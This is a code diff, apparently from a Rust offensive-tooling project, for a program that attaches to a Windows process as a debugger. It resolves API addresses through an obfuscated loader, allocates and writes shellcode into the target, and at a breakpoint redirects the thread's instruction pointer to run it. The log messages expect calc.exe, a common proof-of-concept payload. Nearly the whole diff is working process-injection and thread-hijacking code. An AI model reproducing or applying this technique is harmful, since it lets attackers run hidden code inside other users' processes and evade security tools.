@@ -7,8 +7,7 @@ use winapi::{
         ntdef::{HANDLE, NTSTATUS},
     },
     um::{
-        minwinbase::{DEBUG_EVENT, LPCONTEXT},
-        winnt::{ACCESS_MASK, CONTEXT, MAXIMUM_ALLOWED},
+        errhandlingapi::GetLastError, minwinbase::{DEBUG_EVENT, LPCONTEXT}, winnt::{ACCESS_MASK, CONTEXT, MAXIMUM_ALLOWED}
     },
 };
 
@@ -175,6 +174,11 @@ type VirtualProtectExFn = unsafe extern "system" fn(
     lpflOldProtect: *mut DWORD,
 ) -> BOOL;
 
+// Add these constants if not already present
+const EXCEPTION_ACCESS_VIOLATION: DWORD = 0xC0000005;
+const EXCEPTION_BREAKPOINT: DWORD = 0x80000003;
+const EXIT_THREAD_DEBUG_EVENT: DWORD = 4;
+
 fn main() {
     let args: Vec<String> = std::env::args().collect();
 
@@ -259,13 +263,22 @@ fn main() {
         h_process = unsafe { debug_event.u.CreateProcessInfo().hProcess };
         h_thread = unsafe { debug_event.u.CreateProcessInfo().hThread };
         println!(
-            "[+] Debug event received - TID: {}, Process Handle: {:?}, Thread Handle: {:?}",
-            tid, h_process, h_thread
+            "[+] Debug event received - Type: 0x{:x}, TID: {}, Process Handle: {:?}, Thread Handle: {:?}",
+            debug_event.dwDebugEventCode, tid, h_process, h_thread
         );
+        
+        if debug_event.dwDebugEventCode == 3 {  // CREATE_PROCESS_DEBUG_EVENT
+            println!("[*] Initial process creation event");
+            println!("[*] Process entry point: 0x{:x}", 
+                unsafe { debug_event.u.CreateProcessInfo().lpStartAddress
+                    .map(|addr| addr as *mut c_void as u64)
+                    .unwrap_or(0) 
+                }
+            );
+        }
     }
 
     //locate address for GetThreadContext in kernel32
-
     let get_thread_context = noldr::get_function_address(kernel32, &lc!("GetThreadContext"))
         .unwrap_or_else(|| std::ptr::null_mut());
     println!("[+] GetThreadContext address: {:?}", get_thread_context);
@@ -282,29 +295,11 @@ fn main() {
     let success = unsafe { get_thread_context(h_thread, &mut original_context) };
     if success != 0 {
         println!("[+] Got original thread context");
-
-        // Get current context (for single step)
-        let success = unsafe { get_thread_context(h_thread, &mut current_context) };
-        if success != 0 {
-            println!("[+] Got current thread context");
-        }
+        println!("[*] Original RIP: 0x{:x}", original_context.Rip);
+        println!("[*] Original RSP: 0x{:x}", original_context.Rsp);
     }
-
-    // In main after getting contexts
-    current_context.EFlags |= 0x100;
-
-    let set_thread_context = noldr::get_function_address(kernel32, &lc!("SetThreadContext"))
-        .unwrap_or_else(|| std::ptr::null_mut());
-    println!("[+] SetThreadContext address: {:?}", set_thread_context);
-
-    let set_thread_context: SetThreadContextFn = unsafe { std::mem::transmute(set_thread_context) };
-
-    let success = unsafe { set_thread_context(h_thread, &current_context) };
-    if success != 0 {
-        println!("[+] Successfully set thread context with single step flag");
-    }
-
-    // After getting the debug event but before the debug loop:
+    
+    // writing shellcode to target process memory
     let virtual_alloc_ex = noldr::get_function_address(kernel32, &lc!("VirtualAllocEx"))
         .unwrap_or_else(|| std::ptr::null_mut());
     println!("[+] VirtualAllocEx address: {:?}", virtual_alloc_ex);
@@ -322,14 +317,14 @@ fn main() {
     println!("[+] VirtualProtectEx address: {:?}", virtual_protect_ex);
     let virtual_protect_ex: VirtualProtectExFn = unsafe { std::mem::transmute(virtual_protect_ex) };
 
-    // Allocate memory for shellcode with RW permissions initially
+    // Allocate memory for shellcode in target process with RW permissions initially
     let shellcode_address = unsafe {
         virtual_alloc_ex(
             h_process,
             std::ptr::null_mut(),
             SHELL_CODE.len(),
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,  // Changed from PAGE_EXECUTE_READWRITE
+            PAGE_READWRITE, // Changed from PAGE_EXECUTE_READWRITE
         )
     };
     println!(
@@ -375,83 +370,186 @@ fn main() {
     let continue_debug_event: ContinueDebugEventFn =
         unsafe { std::mem::transmute(continue_debug_event) };
 
+    // After allocating memory, before redirecting RIP:
+    println!(
+        "[*] Shellcode allocated at: 0x{:x}",
+        shellcode_address as u64
+    );
+
     let mut cpt = 0;
+    let mut breakpoint_handled = false;
+
     while cpt < 1 {
         if debug_event.dwDebugEventCode == EXCEPTION_DEBUG_EVENT {
             println!("[*] Got debug event: Exception");
             let exception_code = unsafe { debug_event.u.Exception().ExceptionRecord.ExceptionCode };
-            
-            if exception_code == 0x80000003 { // Breakpoint
-                println!("[*] Got breakpoint exception");
-                
-                current_context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
-                let success = unsafe { get_thread_context(h_thread, &mut current_context) };
-                if success != 0 {
-                    println!("[*] Current RIP before redirect: {:x}", current_context.Rip);
-                    println!("[*] Current RSP: {:x}", current_context.Rsp);
-                    println!("[*] Current EFLAGS: {:x}", current_context.EFlags);
-                    
-                    // Ensure stack is 16-byte aligned for x64 calling convention
-                    current_context.Rsp &= !0xF;
-                    // Allocate some stack space for our shellcode
-                    current_context.Rsp -= 0x2000;
-                    
-                    // Clear registers that shellcode might depend on
-                    current_context.Rcx = 0;
-                    current_context.Rdx = 0;
-                    current_context.R8 = 0;
-                    current_context.R9 = 0;
-                    
-                    // Set RIP to shellcode
-                    current_context.Rip = shellcode_address as u64;
-                    println!("[*] Setting RIP to shellcode address: {:x}", shellcode_address as u64);
-                    println!("[*] Adjusted RSP to: {:x}", current_context.Rsp);
-                    
-                    let success = unsafe { set_thread_context(h_thread, &mut current_context) };
+            let exception_address = unsafe { debug_event.u.Exception().ExceptionRecord.ExceptionAddress };
+            println!("[*] Exception Code: 0x{:x} at address: 0x{:x}", exception_code, exception_address as u64);
+            println!("[*] First chance: {}", unsafe { debug_event.u.Exception().dwFirstChance });
+
+            if exception_code == 0x80000003 {
+                if breakpoint_handled {
+                    println!("[!] WARNING: Hit breakpoint again after already handling it!");
+                    println!("[!] Previous shellcode address: 0x{:x}", shellcode_address as u64);
+                    println!("[!] Current RIP: 0x{:x}", current_context.Rip);
+                } else {
+                    breakpoint_handled = true;
+                    println!("[*] Got initial breakpoint exception");
+                    // Breakpoint
+                    println!("[*] Got breakpoint exception");
+
+                    // This is where we should do the thread context manipulation
+                    current_context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
+                    let success = unsafe { get_thread_context(h_thread, &mut current_context) };
                     if success != 0 {
-                        println!("[*] Successfully set thread context with shellcode entry");
+                        println!("[*] Thread context before modification:");
+                        println!("[*] RIP: 0x{:x}", current_context.Rip);
+                        println!("[*] RSP: 0x{:x}", current_context.Rsp);
+                        println!("[*] RAX: 0x{:x}", current_context.Rax);
+                        println!("[*] RCX: 0x{:x}", current_context.Rcx);
+                        println!("[*] RDX: 0x{:x}", current_context.Rdx);
+                        println!("[*] Flags: 0x{:x}", current_context.EFlags);
+
+                        // Adjust stack and set up return address
+                        current_context.Rsp -= 8;  // Make space for return address
+                        let ret_addr = current_context.Rip;  // Use original RIP as return
                         
-                        // Continue execution
-                        unsafe { 
-                            continue_debug_event(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
+                        // Write return address to stack
+                        let mut bytes_written = 0;
+                        unsafe {
+                            write_process_memory(
+                                h_process,
+                                current_context.Rsp as *mut c_void,
+                                &ret_addr as *const u64 as *const c_void,
+                                8,
+                                &mut bytes_written,
+                            );
                         }
-                        
+
+                        // Set RIP to shellcode
+                        current_context.Rip = shellcode_address as u64;
+                        println!("[*] Setting RIP to shellcode address: {:x}", current_context.Rip);
+
+                        //print the rip and rsp
+                        println!("[*] RIP: {:x}", current_context.Rip);
+                        println!("[*] RSP: {:x}", current_context.Rsp);
+
+                        // Apply the context changes
+                        println!("[*] Thread handle value: {:?}", h_thread);
+                        let set_thread_context = noldr::get_function_address(kernel32, &lc!("SetThreadContext"))
+                            .unwrap_or_else(|| std::ptr::null_mut());
+                        println!("[+] SetThreadContext address: {:?}", set_thread_context);
+                        let set_thread_context: SetThreadContextFn = unsafe { std::mem::transmute(set_thread_context) };
+                        let success = unsafe { set_thread_context(h_thread, &mut current_context) };
+                        let error = unsafe { GetLastError() };
+                        println!("[*] SetThreadContext result: {}, error: {}", success, error);
+
+
+                        // Verify our changes took effect
+                        let mut verify_context: CONTEXT = unsafe { std::mem::zeroed() };
+                        verify_context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
+                        let verify_success = unsafe { get_thread_context(h_thread, &mut verify_context) };
+                        println!("[*] Verification - New RIP: 0x{:x}, New RSP: 0x{:x}", 
+                            verify_context.Rip, verify_context.Rsp);
+                            println!("[*] Thread context after modification:");
+                            println!("[*] RIP: 0x{:x}", verify_context.Rip);
+                            println!("[*] RSP: 0x{:x}", verify_context.Rsp);
+                            println!("[*] RAX: 0x{:x}", verify_context.Rax);
+                            println!("[*] RCX: 0x{:x}", verify_context.Rcx);
+                            println!("[*] RDX: 0x{:x}", verify_context.Rdx);
+                            println!("[*] Flags: 0x{:x}", verify_context.EFlags);
+                        // After continuing execution
+                        println!("[*] Continuing after breakpoint with DBG_CONTINUE");
+                        unsafe {
+                            let continue_result = continue_debug_event(
+                                debug_event.dwProcessId,
+                                debug_event.dwThreadId,
+                                DBG_CONTINUE,  // Changed from DBG_EXCEPTION_NOT_HANDLED
+                            );
+                            println!("[*] ContinueDebugEvent result: {}", continue_result);
+                            if continue_result == 0 {
+                                println!("[!] ContinueDebugEvent failed with error: {}", GetLastError());
+                            }
+                        }
+
                         // Wait for any exceptions
                         let mut shellcode_event: DEBUG_EVENT = unsafe { std::mem::zeroed() };
                         while unsafe { wait_for_debug_event(&mut shellcode_event, 1000) } != 0 {
-                            if shellcode_event.dwDebugEventCode == EXCEPTION_DEBUG_EVENT {
-                                let exception_code = unsafe { shellcode_event.u.Exception().ExceptionRecord.ExceptionCode };
-                                println!("[!] Exception during shellcode: {:x}", exception_code);
+                            println!("[*] Got event during shellcode execution: 0x{:x}", shellcode_event.dwDebugEventCode);
+                            
+                            match shellcode_event.dwDebugEventCode {
+                                EXCEPTION_DEBUG_EVENT => {
+                                    let exception_code = unsafe {
+                                        shellcode_event.u.Exception().ExceptionRecord.ExceptionCode
+                                    };
+                                    let exception_address = unsafe {
+                                        shellcode_event.u.Exception().ExceptionRecord.ExceptionAddress
+                                    };
+                                    let first_chance = unsafe { shellcode_event.u.Exception().dwFirstChance };
+                                    
+                                    println!("[*] Exception details:");
+                                    println!("    Code: 0x{:x}", exception_code);
+                                    println!("    Address: 0x{:x}", exception_address as u64);
+                                    println!("    First Chance: {}", first_chance);
+                                    
+                                    match exception_code {
+                                        EXCEPTION_ACCESS_VIOLATION => {
+                                            let info = unsafe { shellcode_event.u.Exception().ExceptionRecord.ExceptionInformation };
+                                            println!("    Access Violation:");
+                                            println!("    Type: {}", info[0]); // 0 = read, 1 = write, 8 = execute
+                                            println!("    Address: 0x{:x}", info[1]);
+                                        },
+                                        EXCEPTION_BREAKPOINT => println!("    Breakpoint Exception"),
+                                        EXCEPTION_SINGLE_STEP => println!("    Single Step Exception"),
+                                        _ => println!("    Unknown Exception Type")
+                                    }
+                                },
+                                EXIT_THREAD_DEBUG_EVENT => {
+                                    let exit_code = unsafe { shellcode_event.u.ExitThread().dwExitCode };
+                                    println!("[*] Thread Exit:");
+                                    println!("    Exit Code: 0x{:x}", exit_code);
+                                },
+                                _ => println!("[*] Other debug event: 0x{:x}", shellcode_event.dwDebugEventCode)
                             }
+
                             unsafe {
-                                continue_debug_event(
+                                let continue_result = continue_debug_event(
                                     shellcode_event.dwProcessId,
                                     shellcode_event.dwThreadId,
-                                    DBG_CONTINUE
+                                    DBG_CONTINUE, // Try DBG_CONTINUE instead of DBG_EXCEPTION_NOT_HANDLED
                                 );
+                                println!("[*] ContinueDebugEvent result: {} (error: {})", 
+                                    continue_result, GetLastError());
                             }
                         }
-                        
+                        println!("[*] No more debug events received after 1 second timeout");
+
                         cpt += 1;
                     }
                 }
             } else {
-                println!("[*] Got different exception: {:x}", exception_code);
-                unsafe { 
-                    continue_debug_event(debug_event.dwProcessId, debug_event.dwThreadId, DBG_EXCEPTION_NOT_HANDLED);
+                // Silently handle non-breakpoint exceptions
+                unsafe {
+                    continue_debug_event(
+                        debug_event.dwProcessId,
+                        debug_event.dwThreadId,
+                        DBG_EXCEPTION_NOT_HANDLED,
+                    );
                 }
             }
         } else {
-            if debug_event.dwDebugEventCode != 2 && debug_event.dwDebugEventCode != 6 {
-                println!("[*] Got debug event type: {}", debug_event.dwDebugEventCode);
-            }
-            unsafe { 
-                continue_debug_event(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
+            // Silently handle non-exception events
+            unsafe {
+                continue_debug_event(
+                    debug_event.dwProcessId,
+                    debug_event.dwThreadId,
+                    DBG_EXCEPTION_NOT_HANDLED,
+                );
             }
         }
-        
+
         if cpt == 0 {
-            unsafe { 
+            unsafe {
                 wait_for_debug_event(&mut debug_event, INFINITE);
             }
         }
@@ -460,24 +558,52 @@ fn main() {
     // After the debug loop
     println!("[+] Resuming process");
     original_context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
-    
-    let success = unsafe { set_thread_context(h_thread, &original_context) };
-    if success == 0 {
-        println!("[!] Failed to restore original context");
-    }
-    
-    unsafe { 
-        continue_debug_event(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
+
+    // Add this new section here, before stopping debug
+    println!("[*] Waiting for next debug event after RIP change...");
+    let mut next_event: DEBUG_EVENT = unsafe { std::mem::zeroed() };
+    const TIMEOUT_MS: DWORD = 60000;  // 60 second timeout
+
+    while unsafe { wait_for_debug_event(&mut next_event, TIMEOUT_MS) } != 0 {
+        match next_event.dwDebugEventCode {
+            EXIT_THREAD_DEBUG_EVENT => {
+                println!("[+] Thread exited - shellcode execution complete");
+                unsafe {
+                    continue_debug_event(
+                        next_event.dwProcessId,
+                        next_event.dwThreadId,
+                        DBG_CONTINUE,
+                    );
+                }
+                break;  // Exit the loop after thread exit
+            },
+            EXCEPTION_DEBUG_EVENT => {
+                // Only log non-breakpoint exceptions
+                let exception_code = unsafe { next_event.u.Exception().ExceptionRecord.ExceptionCode };
+                if exception_code != EXCEPTION_BREAKPOINT {
+                    println!("[*] Exception event: 0x{:x}", exception_code);
+                }
+            },
+            _ => () // Ignore other events
+        }
+        
+        // Continue all events
+        unsafe {
+            continue_debug_event(
+                next_event.dwProcessId,
+                next_event.dwThreadId,
+                DBG_CONTINUE,
+            );
+        }
     }
 
-        // After the debug loop, before detaching
-        println!("[*] Press Enter to detach and exit...");
-        let mut input = String::new();
-        std::io::stdin().read_line(&mut input).unwrap();
+    println!("[*] Waiting a few seconds for calc.exe to appear...");
+    std::thread::sleep(std::time::Duration::from_secs(3));
+    println!("[+] Done!");
 
-    //this should always be at the end of main during dev
     println!("[+] Stopping debug on target process");
     unsafe { debug_active_process_stop(target_pid as DWORD) };
+
 }
 
 fn locate_process(
@@ -718,3 +844,4 @@ pub fn get_function_address(dll_base: *const c_void, function_name: &str) -> Opt
     }
     None
 }
+
